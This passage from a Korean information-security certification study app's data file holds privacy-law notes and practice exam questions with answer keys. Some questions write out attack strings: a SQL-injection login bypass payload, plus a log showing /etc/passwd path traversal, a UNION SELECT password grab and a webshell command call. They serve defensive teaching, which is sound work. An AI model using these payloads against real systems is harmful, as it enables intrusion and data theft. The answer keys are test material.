개인정보의 수\n  2. 제3자 제공 여부\n  3. 정보주체 권리 침해 가능성 및 위험 정도\n  4. 민감정보·고유식별정보 처리 여부\n  5. 개인정보 보유기간\n- **위험도 산정 기준** : `개인정보 영향도 + 침해요인 발생 가능성 × 법적 준거성 × 2`","added":false},{"title":"개인정보 가명처리 — 랜덤 라운딩 (Random Rounding)","star":false,"body":"- 수치 데이터를 임의의 자릿수·실제 수 기준으로 올림(Round Up) 또는 내림(Round Down)하는 기법","added":false},{"title":"CCTV(고정형 영상정보처리기기) 설치·운영 조치","star":false,"body":"- **사옥 외부** : 설치 목적 적정성 확인 / 안내판(표지판) 설치 / 최소 범위 설치 / 영상정보 안전 관리\n- **사옥 내부(제한구역)** : 법적 근거 마련(동의 획득) / 안전성 확보 조치 / 운영·관리 방침 마련 / 정보주체 열람권 보장","added":false},{"title":"생체인식정보 보호 6대 원칙  (서술형 빈출)","star":true,"body":"1. **비례성** : 생체인식정보 처리에 따른 **편익 대비 침해 위험성**이 크지 않은지 고려하여 활용 여부 판단\n2. **적법성** : 수집·이용·제공 등 처리의 **근거가 적법·명확**해야 함\n3. **목적제한** : 동의받은 **인증·식별 이외의 목적**으로 무단 활용 금지\n4. **투명성** : 생체인식정보 보호에 관한 사항을 정보주체에게 **알기 쉽게 공개**\n5. **안전성** : 분실·도난·유출·위조·변조·훼손되지 않도록 **안전하게 처리·관리**\n6. **통제권 보장** : 정보주체가 자신의 생체인식정보를 **스스로 통제할 수 있는 수단** 제공","added":false},{"title":"정보보호 최고책임자(CISO) 역할 및 책임(R&R)","star":true,"body":"> 정보통신망법 제45조의3. 4가지 이상 서술\n1. 정보보호 **관리체계의 수립·시행 및 개선**\n2. 정보보호 **취약점 분석·평가 및 개선**\n3. **침해사고의 예방 및 대응**\n4. 사전 정보보호대책 마련 및 보안조치 **설계·구현**\n5. 정보보호 **사전 보안성 검토**\n6. 중요 정보의 암호화 및 보안서버 적합성 검토\n7. 기타 관계 법령에 따른 정보보호 필요 조치 이행","added":false},{"title":"정보보호정책 (Policy)","star":false,"body":"- 기업의 정보보호 방향(목적·활동)을 기술·솔루션과 **독립적으로** 정의한 **최상위 개념 문서**\n\n::보강::\n- **문서 위계(상위→하위)** ★ : **정책(Policy)** → **지침/표준(Standard)** → **절차(Procedure)** → **지침서/가이드(Guideline)**\n  - **정책** : 조직의 의지·방향(왜·무엇을) — 최상위, 경영진 승인\n  - **표준** : 반드시 지켜야 할 구체 기준(무엇을 얼마나)\n  - **절차** : 실제 수행 방법(어떻게), 단계별 상세\n- **요건** : 경영진 승인·서명, 전 구성원 대상 공표, 주기적 검토·개정","added":false,"hasAdd":true},{"title":"정보보호 관련 법령 약칭","star":true,"body":"- **정보통신망법** : 정보통신망 이용 촉진 및 정보보호 등에 관한 법률\n- **정보통신기반보호법** : 정보통신기반 보호에 관한 법률\n- **위치정보법** : 위치정보의 이용 및 보호 등에 관한 법률","added":false},{"title":"법령 용어 정의","star":true,"body":"- **정보통신망** : 전기통신설비·컴퓨터·이용기술을 활용해 정보를 수집·가공·저장·검색·송신·수신하는 정보통신체제\n- **정보보호시스템** : 정보의 수집·저장·송수신 시 유출·위변조·훼손을 방지하기 위한 HW·SW 일체\n- **정보통신기반시설** : 국가안보·행정·국방·금융·통신·에너지 등 업무와 관련된 전자적 제어·관리 시스템\n- **내부관리계획** : 개인정보의 안전한 처리를 위해 보호조직 구성·교육·보호조치 등을 규정한 계획\n- **전자적 침해행위** : 인증 절차를 우회하는 프로그램·장치를 기반시설에 설치하여 정보통신망을 공격하는 행위\n- **정보보호 사전점검** : 정보통신망 구축·서비스 제공 이전 계획·설계 과정에서 정보보호를 고려해 조치하는 것\n- **집적정보통신시설(IDC) 사업자** (망법 제46조) : 타인의 정보통신서비스 제공을 위해 **다수의 정보통신설비를 집적·운영·관리**하는 시설의 사업자 (안정적 운영을 위한 보호조치 의무)","added":false},{"title":"개인정보 접속기록 (안전성 확보조치 기준)","star":true,"body":"- **접속기록 정의(제2조)** : 개인정보취급자의 **계정 / 접속일시 / 접속지 정보 / 처리한 정보주체 정보 / 수행업무** 등을 전자적으로 기록한 것\n- **보관 기간(제8조)** : **1년 이상** 보관. 단, **5만명 이상** 정보주체 처리 또는 **고유식별정보·민감정보** 처리 시스템은 **2년 이상**\n- **점검** : 접속기록을 **월 1회 이상** 점검. 다운로드 발견 시 **내부관리계획**으로 정한 바에 따라 사유 확인","added":false},{"title":"가명정보 / 익명정보","star":true,"body":"- **가명처리 정의** : 개인정보의 일부 삭제·대체 등으로 **추가 정보 없이는 특정 개인을 알아볼 수 없게** 처리하는 것\n- **가명처리 4단계** : 사전 준비 → 가명처리 → **적정성 검토 및 추가 가명처리** → 사후 관리\n- **정보주체 동의 없이 가능한 경우** : **통계 작성, 과학적 연구, 공익적 기록보존**\n- **익명정보** : 시간·비용·기술을 합리적으로 고려해도 더 이상 개인을 알아볼 수 없는 정보 → **개인정보보호법 적용 대상 아님**","added":false},{"title":"개인정보 수집·이용 가능 경우 (제15조)","star":true,"body":"> 최소수집 원칙 하에 6개 중 택하여 서술\n1. 정보주체의 **동의**를 받은 경우\n2. **법률에 특별한 규정**이 있거나 법령상 의무 준수를 위해 불가피한 경우\n3. **공공기관이 소관 업무 수행**을 위해 불가피한 경우\n4. 정보주체와의 **계약 체결·이행**을 위해 불가피하게 필요한 경우\n5. 정보주체·법정대리인이 의사표시를 할 수 없는 상태에서 **급박한 생명·신체·재산 이익**을 위해 필요한 경우\n6. 개인정보처리자의 **정당한 이익**이 정보주체의 권리보다 명백히 우선하는 경우","added":false},{"title":"개인정보 처리방침 (수립 시 포함사항)","star":true,"body":"- 처리 목적 / 처리·보유 기간 / 제3자 제공 / 파기 절차·방법 / 처리 위탁 / 정보주체 권리·행사 방법 / 개인정보 보호책임자 연락처 / 자동수집장치(쿠키) 설치·운영 및 거부 / 처리하는 개인정보 항목 / 안전성 확보 조치\n- **알리는 방법** : 홈페이지 게시 / 사업장 게시 / 관보·신문 게재 / 간행물·소식지 배포 / 계약서에 실어 발급","added":false},{"title":"비밀번호 작성 규칙 (기술적·관리적 보호조치)","star":true,"body":"1. **복잡도·길이** : 2종류 조합 시 **10자리 이상**, 3종류 조합 시 **8자리 이상**\n2. **유추 어려운 비밀번호** : 연속 숫자·생일·전화번호·아이디 유사 비밀번호 금지\n3. **유효기간 설정** : 최소 **반기 1회 이상** 변경\n\n\n*정보보안기사 실기 통합 정리 끝.*","added":false},{"title":"개인정보 안전성 확보조치 (내부관리계획·접근권한 등)","star":true,"body":"- **내부관리계획 수립** : 개인정보 보호책임자 지정, 교육, 접근권한·접속기록·암호화 등 기술적·관리적 조치 규정\n- **접근 권한 관리** : 업무상 최소 인원에게 차등 부여, 권한 부여·변경·말소 기록을 **최소 3년 보관**\n- **접근 통제** : 인가되지 않은 접근 차단(방화벽 등), 외부 접속 시 **VPN·전용선** 등 안전한 접속수단, **일정 횟수 인증 실패 시 조치**\n- **암호화** : 비밀번호·바이오정보·주민번호·계좌·카드번호 등 저장·전송 시 암호화, 비밀번호는 **일방향(해시)** 암호화\n- **접속기록 보관·점검** : 1년(또는 2년) 이상 보관, 월 1회 이상 점검\n- **악성프로그램 방지** : 백신 설치·주기 갱신·실시간 점검","added":true},{"title":"개인정보 파기 (제21조)","star":true,"body":"- **원칙** : 보유기간 경과·처리목적 달성 등 개인정보가 **불필요하게 되었을 때 지체 없이(5일 이내) 파기**\n- **파기 방법**\n  - **전자적 파일** : **복원 불가능한 방법으로 영구 삭제** (로우레벨 포맷·디가우징 등)\n  - **기록물·인쇄물** : **파쇄 또는 소각**\n- **분리 보관** : 다른 법령에 따라 보존해야 하는 경우, 해당 개인정보를 **별도 DB·물리적 분리 보관**","added":true},{"title":"정보주체의 권리 (제4조)","star":true,"body":"- **정보주체의 권리 (개인정보보호법 제4조)**\n  1. 개인정보 처리에 관한 **정보를 제공받을 권리**\n  2. 처리에 관한 **동의 여부·범위를 선택하고 결정할 권리**\n  3. 처리 여부 확인 및 **열람(사본 발급 포함) 요구권**\n  4. 처리 정지·**정정·삭제 및 파기 요구권**\n  5. 피해를 **신속·공정한 절차로 구제받을 권리**\n  6. 완전히 자동화된 결정(프로파일링 등)에 대한 **거부·설명 요구권** (2023 개정 신설)","added":true},{"title":"개인정보 유출 통지·신고 (제34조)","star":false,"body":"- **정보주체 통지** : 유출 사실을 알게 된 때 **지체 없이(72시간 이내)** 통지\n  - 통지 항목 : 유출된 항목 / 유출 시점·경위 / 피해 최소화 방법 / 대응조치·구제절차 / 신고 접수 담당부서·연락처\n- **전문기관 신고** : **1천명 이상** 정보주체의 개인정보 유출 시 **72시간 이내** 개인정보보호위원회 또는 **KISA**에 신고","added":true}]}]}];window.EXAM_DATA={"title":"정보보안기사 실기 · 2026년 제2회 대비 예상문제","rounds":[{"title":"제1회 예상문제","subtitle":"단답형 12 · 서술형 4 · 실무형 2(택1) · 총 100점 · 180분","questions":[{"num":1,"type":"단답형","points":3,"domain":"시스템 보안","question":"다음은 리눅스 특수 권한에 대한 설명이다. 빈칸 (①), (②)에 들어갈 알맞은 용어를 쓰시오.\n\n- 실행 파일에 ( ① ) 비트가 설정되면, 해당 파일을 실행하는 동안 실행 사용자의 권한이 아니라 **파일 소유자의 권한**으로 동작한다. `/usr/bin/passwd`가 대표적이며, 권한이 root이면 권한 상승 공격에 악용될 수 있다.\n- 디렉터리에 ( ② ) 비트가 설정되면, 해당 디렉터리 내 파일은 **파일 소유자·디렉터리 소유자·root만 삭제** 가능하다. `/tmp` 디렉터리에 설정되어 있으며 권한 표기 시 `t`로 나타난다.","scenario":"","answer":"① SetUID (SUID)\n② Sticky Bit (스티키 비트)","explanation":"SetUID(4000)는 실행 시 소유자(EUID) 권한으로 동작하여 권한 상승의 통로가 되므로, 불필요한 SetUID 파일은 주기적으로 점검(`find / -perm -4000`)해야 한다. Sticky Bit(1000)는 공유 디렉터리에서 타인 파일의 삭제를 방지한다. 참고로 SetGID(2000)는 그룹 권한으로 실행된다."},{"num":2,"type":"단답형","points":3,"domain":"시스템 보안","question":"다음 설명에 해당하는 리눅스 로그 파일명을 각각 쓰시오.\n\n- ( ① ) : 로그인에 **실패한** 기록이 저장되며, `lastb` 명령으로 확인한다.\n- ( ② ) : 성공한 로그인·로그아웃 및 시스템 재부팅 이력이 저장되며, `last` 명령으로 확인한다.","scenario":"","answer":"① btmp\n② wtmp","explanation":"로그인 관련 바이너리 로그는 텍스트 편집기로 볼 수 없고 전용 명령어를 사용한다. utmp(현재 로그인, `who`/`w`), wtmp(성공 이력, `last`), btmp(실패, `lastb`), lastlog(최근 로그인, `lastlog`). 공격자가 흔적 제거를 위해 btmp/wtmp를 삭제·변조하므로 원격 로그 서버 수집이 권장된다."},{"num":3,"type":"단답형","points":3,"domain":"네트워크 보안","question":"다음은 특정 포트 스캔 기법에 대한 설명이다. 해당하는 스캔 기법의 명칭을 쓰시오.\n\nTCP 헤더의 플래그를 **FIN, PSH, URG** 3개만 1로 설정하여 대상 포트에 전송한다. 대상 포트가 **닫혀 있으면 RST 응답**이 오고, **열려 있으면 응답이 없다.** 방화벽·IDS 로그에 잘 남지 않는 스텔스 스캔의 일종이다.","scenario":"","answer":"XMAS 스캔 (크리스마스트리 스캔, Xmas Scan)","explanation":"FIN+PSH+URG 플래그를 모두 켜 패킷이 '크리스마스 트리처럼 반짝인다'고 하여 XMAS 스캔이라 한다. FIN 스캔(FIN만), NULL 스캔(모든 플래그 off)과 함께 스텔스 스캔에 속하며, 세 기법 모두 '열림=무응답, 닫힘=RST' 규칙을 따른다(단 Windows는 이 규칙을 따르지 않아 구분에 이용됨)."},{"num":4,"type":"단답형","points":3,"domain":"네트워크 보안","question":"다음 설명에 해당하는 공격 기법을 쓰시오.\n\n공격자가 위조된 ARP Reply 패킷을 지속적으로 전송하여, 피해자의 ARP 캐시 테이블에 **게이트웨이의 IP와 공격자의 MAC 주소를 매핑**시킨다. 이를 통해 같은 LAN 구간의 트래픽을 공격자에게 흐르게 하여 스니핑·중간자 공격(MITM)을 수행한다.","scenario":"","answer":"ARP 스푸핑 (ARP Spoofing / ARP Cache Poisoning)","explanation":"ARP는 인증 절차가 없어 위조 Reply를 그대로 캐시에 반영하는 취약점이 있다. 대응으로는 중요 시스템의 **ARP 테이블 정적(static) 등록**, ARP 스푸핑 탐지 도구(arpwatch), 스위치의 **DAI(Dynamic ARP Inspection)** 기능을 활용한다."},{"num":5,"type":"단답형","points":3,"domain":"네트워크 보안","question":"다음은 무선랜 보안 표준에 대한 설명이다. (①), (②)에 들어갈 용어를 쓰시오.\n\n- WEP의 취약점을 보완하기 위해 등장했으며, 패킷마다 키를 동적으로 변경하는 ( ① ) 프로토콜을 사용한 것이 WPA이다.\n- WPA2는 ( ② ) 알고리즘 기반의 CCMP를 사용하여 현재까지 널리 쓰이는 강력한 무선 보안 표준이다.","scenario":"","answer":"① TKIP\n② AES","explanation":"WEP은 고정 키와 짧은 IV(24bit)로 RC4를 사용해 쉽게 크랙된다. WPA는 TKIP로 키를 동적 변경했으나 여전히 RC4 기반이라 한계가 있었고, WPA2는 AES 기반 CCMP로 기밀성·무결성을 강화했다. 최신 표준은 WPA3(SAE 기반)이다."},{"num":6,"type":"단답형","points":3,"domain":"애플리케이션·웹 보안","question":"다음 설명에 해당하는 웹 공격 기법을 쓰시오.\n\n사용자가 로그인된 상태를 악용하여, 공격자가 만든 악성 페이지·링크를 클릭하게 함으로써 **사용자 의도와 무관한 요청(예: 비밀번호 변경, 송금)을 서버로 전송**시키는 공격이다. 서버는 정상 사용자의 요청으로 오인하여 처리한다.","scenario":"","answer":"CSRF (Cross-Site Request Forgery, 사이트 간 요청 위조)","explanation":"CSRF는 '서버가 사용자를 신뢰'하는 점을 악용한다(반면 XSS는 '사용자가 서버를 신뢰'하는 점을 악용). 대응으로는 **CSRF 토큰**(요청마다 예측 불가능한 토큰 검증), Referer/Origin 헤더 검증, 중요 작업 시 **재인증**, SameSite 쿠키 속성 설정이 있다."},{"num":7,"type":"단답형","points":3,"domain":"애플리케이션·웹 보안","question":"다음은 웹 서버 공격에 대한 설명이다. 빈칸에 들어갈 용어를 쓰시오.\n\n공격자가 파일 업로드 취약점 등을 이용해 서버에 악성 스크립트(jsp, php, asp 등) 파일을 업로드한 뒤, 이 파일에 접근하여 **원격에서 서버의 명령을 실행**하고 시스템을 제어한다. 이때 업로드되는 악성 스크립트 파일을 ( )(이)라 한다.","scenario":"","answer":"웹셸 (Web Shell)","explanation":"웹셸은 업로드 취약점의 대표적 결과물이다. 대응으로는 업로드 파일 **확장자 화이트리스트 검증**, 업로드 디렉터리의 **실행 권한 제거**, 업로드 경로와 실행 경로 분리, 웹셸 탐지 도구(휘슬 등) 정기 점검이 있다."},{"num":8,"type":"단답형","points":3,"domain":"정보보안 일반","question":"다음은 블록 암호 운영 모드에 대한 설명이다. (①), (②)에 알맞은 모드를 쓰시오.\n\n- ( ① ) : 각 평문 블록을 독립적으로 암호화하여 **동일한 평문 블록이 동일한 암호문 블록**이 된다. 패턴이 노출되어 안전하지 않다.\n- ( ② ) : 이전 암호문 블록과 현재 평문 블록을 XOR한 후 암호화한다. 첫 블록에는 초기화 벡터(IV)가 필요하다.","scenario":"","answer":"① ECB (Electronic Codebook)\n② CBC (Cipher Block Chaining)","explanation":"ECB는 블록 독립 처리로 병렬화가 쉽지만 패턴이 그대로 드러나 실무에서 사용하지 않는다. CBC는 체이닝으로 패턴을 감추지만 IV가 필요하고 순차 암호화만 가능하다. 그 외 CTR(카운터, 병렬 가능), GCM(CTR+무결성 인증)이 널리 쓰인다."},{"num":9,"type":"단답형","points":3,"domain":"정보보안 일반","question":"다음 설명에 해당하는 접근통제 정책을 각각 쓰시오.\n\n- ( ① ) : 자원의 소유자가 자신의 판단에 따라 다른 주체에게 접근 권한을 부여·회수한다. 유연하지만 트로이목마에 취약하다.\n- ( ② ) : 주체와 객체에 부여된 **보안 등급(라벨)**을 비교하여 시스템이 강제로 접근을 통제한다. 군사 기밀 등 높은 보안이 요구되는 환경에 적합하다.","scenario":"","answer":"① DAC (Discretionary Access Control, 임의적 접근통제)\n② MAC (Mandatory Access Control, 강제적 접근통제)","explanation":"DAC은 소유자 재량 기반(예: 리눅스 파일 권한), MAC은 보안라벨 기반 강제 통제(예: SELinux, BLP 모델), RBAC은 **역할(Role)** 기반으로 조직의 직무에 권한을 매핑한다. RBAC은 관리 편의성이 높아 기업 환경에서 널리 쓰인다."},{"num":10,"type":"단답형","points":3,"domain":"정보보안 일반","question":"다음은 전자서명에 대한 설명이다. 빈칸 (①), (②)에 들어갈 키를 쓰시오.\n\n송신자는 원문의 해시값을 자신의 ( ① )(으)로 암호화하여 서명을 생성한다. 수신자는 송신자의 ( ② )(으)로 서명을 복호화한 해시값과, 수신한 원문을 직접 해시한 값을 비교하여 검증한다.","scenario":"","answer":"① (송신자의) 개인키 (Private Key)\n② (송신자의) 공개키 (Public Key)","explanation":"전자서명은 **개인키로 서명(암호화), 공개키로 검증(복호화)**한다. 이를 통해 무결성·인증·부인방지를 제공하나 **기밀성은 제공하지 않는다**(원문 자체는 암호화되지 않음). 기밀성까지 필요하면 별도로 수신자 공개키로 원문을 암호화한다."},{"num":11,"type":"단답형","points":3,"domain":"정보보안 관리 및 법규","question":"다음은 개인정보보호법상 개인정보 파기에 대한 설명이다. 빈칸에 들어갈 내용을 쓰시오.\n\n개인정보처리자는 보유기간의 경과, 처리목적 달성 등 개인정보가 불필요하게 되었을 때에는 지체 없이(정당한 사유가 없으면 ( ① )일 이내) 그 개인정보를 파기하여야 한다. 전자적 파일 형태인 경우 ( ② )한 방법으로 영구 삭제하여야 한다.","scenario":"","answer":"① 5(일)\n② 복원이 불가능(한 방법으로)","explanation":"개인정보가 불필요해지면 지체 없이(정당한 사유가 없는 한 5일 이내) 파기해야 한다. 전자적 파일은 **복원 불가능한 방법으로 영구 삭제**(로우레벨 포맷·디가우징 등), 인쇄물·기록물은 **파쇄 또는 소각**한다. 다른 법령에 따라 보존이 필요하면 별도 DB로 분리 보관한다."},{"num":12,"type":"단답형","points":3,"domain":"정보보안 관리 및 법규","question":"다음은 ISMS-P 인증기준의 3개 영역이다. 빈칸 (①)에 들어갈 영역명을 쓰시오.\n\n1. 관리체계 수립 및 운영\n2. 보호대책 요구사항\n3. ( ① )","scenario":"","answer":"① 개인정보 처리 단계별 요구사항","explanation":"ISMS-P 인증기준은 ①관리체계 수립 및 운영(16개), ②보호대책 요구사항(64개), ③개인정보 처리 단계별 요구사항(21개)의 3영역 101개 기준으로 구성된다. **ISMS**는 ①+②영역(80개), **ISMS-P**는 개인정보(③영역)까지 포함한 101개 기준으로 인증한다."},{"num":13,"type":"서술형","points":12,"domain":"네트워크 보안","question":"다음 공격에 대하여 물음에 답하시오.\n\n공격자가 출발지 IP를 위조(스푸핑)한 다수의 SYN 패킷을 서버로 전송한 뒤, 서버가 보낸 SYN+ACK에 대한 ACK 응답을 보내지 않는 방식의 DoS 공격이 발생하였다.\n\n(1) 위 공격의 명칭을 쓰고, TCP 3-way handshake와 연관지어 **공격 원리**를 서술하시오. (6점)\n(2) 위 공격에 대한 **대응방안**을 3가지 이상 서술하시오. (6점)","scenario":"","answer":"**(1) 공격 명칭 및 원리**\n- 명칭 : **SYN Flooding (SYN 플러딩)**\n- 원리 : TCP 연결은 3-way handshake(SYN → SYN+ACK → ACK)로 성립된다. 공격자는 출발지 IP를 위조한 SYN 패킷을 대량 전송하고, 서버는 SYN+ACK를 보낸 뒤 마지막 ACK를 기다리며 연결 정보를 **Backlog Queue(대기 큐)**에 저장한 채 **half-open(반연결)** 상태로 유지한다. 위조 IP는 응답하지 않으므로 큐가 가득 차게 되고, 정상 사용자의 연결 요청을 더 이상 받지 못해 서비스 거부가 발생한다.\n\n**(2) 대응방안**\n- **SYN Cookie** 활성화 : 연결 정보를 큐에 저장하지 않고 시퀀스 넘버에 인코딩하여, ACK가 올 때 검증·복원\n- **Backlog Queue 크기 증가** 및 **half-open 연결 타임아웃 단축**\n- 방화벽·IPS에서 **임계치 기반 SYN 패킷 필터링**(초당 SYN 수 제한)\n- **First-SYN Drop**, 침입방지시스템(IPS)·anti-DDoS 장비 도입","explanation":"SYN Flooding은 반연결 상태를 악용하는 대표적 DoS 공격이다. 핵심 대응인 SYN Cookie는 자원 소모 없이 연결을 관리하는 방식으로 반드시 언급해야 한다. 서술형은 '원리+대응'을 구조적으로 나눠 쓰고, 대응은 개수를 채워 부분점수를 확보하는 것이 유리하다."},{"num":14,"type":"서술형","points":12,"domain":"애플리케이션·웹 보안","question":"SQL 인젝션(SQL Injection) 공격에 대하여 다음 물음에 답하시오.\n\n(1) SQL 인젝션 공격의 **개념**을 서술하시오. (4점)\n(2) 아래 로그인 쿼리에서 사용자가 ID 입력란에 `' OR '1'='1' -- ` 를 입력했을 때 **인증이 우회되는 이유**를 서술하시오. (4점)\n(3) SQL 인젝션의 **대응방안**을 3가지 서술하시오. (4점)","scenario":"","answer":"**(1) 개념**\n- 웹 애플리케이션이 사용자 입력값을 검증 없이 SQL 쿼리에 연결(문자열 결합)할 때, 공격자가 **악의적인 SQL 구문을 주입**하여 데이터베이스를 비정상 조작(인증 우회, 정보 유출·변조·삭제)하는 공격이다.\n\n**(2) 인증 우회 이유**\n- 원 쿼리가 `SELECT * FROM users WHERE id='입력' AND pw='입력'` 형태일 때, ID란에 `' OR '1'='1' -- `를 넣으면 쿼리가\n  `... WHERE id='' OR '1'='1' -- ' AND pw='...'` 가 된다.\n- `'1'='1'`은 **항상 참**이고, `--` 이후는 **주석 처리**되어 비밀번호 조건이 무시된다. 결국 WHERE 절이 항상 참이 되어 **비밀번호 없이 인증이 우회**된다.\n\n**(3) 대응방안**\n- **매개변수화 쿼리(Prepared Statement / 바인딩 변수)** 사용 — 입력값을 데이터로만 처리\n- **입력값 검증 및 특수문자 필터링**(`'`, `--`, `;` 등)·이스케이프 처리\n- DB 계정 **최소 권한 부여**, 상세 에러 메시지 노출 차단, **저장 프로시저** 활용, WAF 적용","explanation":"SQL 인젝션은 OWASP Top 10의 단골 항목으로 서술형·실무형 모두 출제된다. 특히 (3)의 근본 대응인 **Prepared Statement(매개변수화 쿼리)**는 반드시 첫 번째로 써야 하는 정답이다. (2)에서 `--` 주석과 `OR '1'='1'`의 항상 참 조건을 명확히 설명하는 것이 채점 포인트다."},{"num":15,"type":"서술형","points":12,"domain":"정보보안 일반","question":"대칭키 암호와 공개키(비대칭키) 암호에 대하여 다음 물음에 답하시오.\n\n(1) 대칭키 암호와 공개키 암호의 **키 사용 방식 차이**를 서술하시오. (4점)\n(2) 대칭키 암호의 **장점과 단점**을 각각 서술하시오. (4점)\n(3) 실무에서 두 방식을 결합한 **하이브리드 암호 방식**이 사용되는 이유를 서술하시오. (4점)","scenario":"","answer":"**(1) 키 사용 방식 차이**\n- **대칭키** : 암호화와 복호화에 **동일한 키**를 사용한다. (예: AES, SEED, ARIA)\n- **공개키** : 서로 다른 **키 쌍(공개키·개인키)**을 사용하며, 공개키로 암호화하면 개인키로만 복호화된다. (예: RSA, ECC)\n\n**(2) 대칭키의 장단점**\n- 장점 : 암·복호화 **속도가 빠르고** 대용량 데이터 처리에 효율적이며, 키 길이가 짧다.\n- 단점 : 통신 상대마다 키가 필요해 **키 개수가 급증**(n명 → n(n-1)/2개)하고, 안전한 **키 분배·교환이 어렵다.** 부인방지를 제공하지 못한다.\n\n**(3) 하이브리드 방식 사용 이유**\n- 대용량 **데이터 본문은 빠른 대칭키**로 암호화하고, 그 **대칭키(세션키)는 안전한 공개키**로 암호화하여 전달한다.\n- 이로써 대칭키의 **속도**와 공개키의 **안전한 키 분배**라는 장점을 모두 취할 수 있다. (예: SSL/TLS, PGP)","explanation":"대칭키 vs 공개키 비교는 실기 서술형 최빈출 주제다. 키 개수 공식 n(n-1)/2, 속도(대칭키가 빠름), 키 분배 문제(공개키가 유리), 부인방지(공개키만 가능)는 핵심 채점 요소다. 하이브리드 방식(SSL/TLS)에서 '세션키를 공개키로 암호화'하는 구조를 명확히 서술해야 한다."},{"num":16,"type":"서술형","points":12,"domain":"정보보안 관리 및 법규","question":"개인정보보호법상 개인정보 유출 등의 통지·신고에 대하여 다음 물음에 답하시오. (개정 법령 기준)\n\n(1) 개인정보가 유출되었을 때 개인정보처리자가 **정보주체에게 통지**해야 하는 시점과, 통지에 포함되어야 할 항목을 4가지 이상 서술하시오. (7점)\n(2) 일정 규모 이상 유출 시 **전문기관에 신고**해야 하는 기준(정보주체 수)과 신고 기한, 신고 기관을 서술하시오. (5점)","scenario":"","answer":"**(1) 정보주체 통지**\n- 시점 : 개인정보 유출 등을 알게 되었을 때에는 **지체 없이(72시간 이내)** 정보주체에게 통지하여야 한다.\n- 통지 항목 :\n  1. 유출된 개인정보의 **항목**\n  2. 유출된 **시점과 그 경위**\n  3. 피해를 **최소화하기 위해 정보주체가 할 수 있는 방법** 등에 관한 정보\n  4. 개인정보처리자의 **대응조치 및 피해 구제절차**\n  5. 정보주체가 신고 등을 접수할 수 있는 **담당부서 및 연락처**\n\n**(2) 전문기관 신고**\n- 기준 : **1천 명 이상**의 정보주체에 관한 개인정보가 유출된 경우\n- 기한 : 유출을 알게 된 때부터 **72시간 이내**\n- 기관 : **개인정보보호위원회** 또는 **한국인터넷진흥원(KISA)**","explanation":"법규 서술형은 수치·기한을 정확히 써야 점수가 나온다. 통지는 '지체 없이(72시간 이내)', 신고는 '1천 명 이상 / 72시간 이내 / 개인정보보호위원회 또는 KISA'가 핵심이다. 통지 항목은 개수를 채울수록 부분점수에 유리하다. 법령은 개정이 잦으므로 시험 직전 최신 조문을 반드시 재확인해야 한다."},{"num":17,"type":"실무형","points":16,"domain":"시스템·네트워크 보안 (침해사고 분석)","question":"아래는 웹 서버 Apache의 access_log 일부이다. 로그를 분석하여 물음에 답하시오.","scenario":"```\n192.168.10.5 - - [10/Aug/2026:14:22:01] \"GET /board/view.php?file=../../../../etc/passwd HTTP/1.1\" 200 1523\n192.168.10.5 - - [10/Aug/2026:14:23:45] \"GET /product.php?id=1 union select id,passwd from members HTTP/1.1\" 200 892\n192.168.10.5 - - [10/Aug/2026:14:25:12] \"POST /upload/notice.php HTTP/1.1\" 200 340\n192.168.10.5 - - [10/Aug/2026:14:25:58] \"GET /upload/cmd.php?cmd=id HTTP/1.1\" 200 128\n```\n\n(1) 위 로그에서 확인되는 **공격 유형 3가지**를 각 요청과 연결하여 쓰시오. (6점)\n(2) 4번째 로그(`cmd.php?cmd=id`)의 응답 코드가 **200**인 것이 왜 위험한지, 그 **판단 근거**를 서술하시오. (4점)\n(3) 위 공격들에 대한 **대응방안**을 3가지 이상 서술하시오. (6점)","answer":"**(1) 공격 유형**\n- ① : **디렉터리 트래버설(경로 조작) / LFI** — `../../../../etc/passwd`로 상위 경로를 거슬러 시스템 파일 접근 시도\n- ② : **SQL 인젝션** — `union select`로 다른 테이블(비밀번호 등) 데이터 탈취 시도\n- ③ : **웹셸 업로드 및 실행** — `cmd.php?cmd=id`로 업로드한 웹셸에 명령 전달(원격 명령 실행)\n\n**(2) 판단 근거**\n- 200 응답은 요청이 **성공 처리**되었음을 의미한다. 특히 `cmd.php?cmd=id`가 200이므로 **웹셸이 실제로 동작**하여 서버 명령이 실행되었을 가능성이 높다.\n\n**(3) 대응방안**\n- 입력값 검증 : 경로 순회 문자(`../`) 및 SQL 특수문자 필터링, **매개변수화 쿼리** 적용\n- 업로드 보안 : 확장자 화이트리스트 검증, 업로드 디렉터리 **실행 권한 제거**, 경로 분리\n- 사후 조치 : 업로드된 **웹셸 파일 삭제**, 침해 계정·로그 분석, WAF 도입, 최신 패치 적용","explanation":"실무형은 로그·패킷을 보고 (1)공격 식별 (2)근거 (3)대응을 요구하는 전형적 유형이다. 한 로그에 여러 공격이 섞여 나오므로 각 요청의 특징(`../`=경로조작, `union select`=SQLi, `.php?cmd=`=웹셸)을 정확히 매칭해야 한다. HTTP 200(성공) 응답의 의미를 근거로 제시하는 것이 고득점 포인트다."},{"num":18,"type":"실무형","points":16,"domain":"네트워크 보안 (방화벽 정책 설계)","question":"아래 요구사항에 따라 리눅스 iptables 방화벽 정책을 설계하려 한다. 물음에 답하시오.","scenario":"**[요구사항]**\n- 기본적으로 외부에서 들어오는 모든 접속은 차단한다.\n- 웹 서비스(HTTP 80, HTTPS 443)는 모두에게 허용한다.\n- SSH(22)는 관리자 PC(192.168.1.100)에서만 접속을 허용한다.\n- 내부에서 시작한 연결에 대한 응답 패킷은 허용한다.\n\n(1) 위 정책의 **기본 정책(Default Policy)**을 어떻게 설정해야 하는지 명령어와 함께 쓰고, 그 이유를 설명하시오. (4점)\n(2) 웹 서비스(80, 443) 허용 규칙을 작성하시오. (4점)\n(3) 관리자 PC에서만 SSH를 허용하는 규칙을 작성하시오. (4점)\n(4) 기존 연결의 응답을 허용하는 규칙을 작성하시오. (4점)","answer":"**(1) 기본 정책(Default Policy) 설정 명령**\n```\niptables -P INPUT DROP\niptables -P FORWARD DROP\niptables -P OUTPUT ACCEPT\n```\n- 모든 인바운드를 기본 차단(DROP)한 뒤 필요한 것만 허용하는 **화이트리스트(Deny All)** 방식이 보안상 안전하다.\n\n**(2) 웹 서비스(80, 443) 허용 규칙**\n```\niptables -A INPUT -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -p tcp --dport 443 -j ACCEPT\n```\n\n**(3) 특정 IP(192.168.1.100)에서만 SSH(22) 허용**\n```\niptables -A INPUT -p tcp -s 192.168.1.100 --dport 22 -j ACCEPT\n```\n\n**(4) 기존 연결 응답 허용(스테이트풀)**\n```\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n```\n- 내부에서 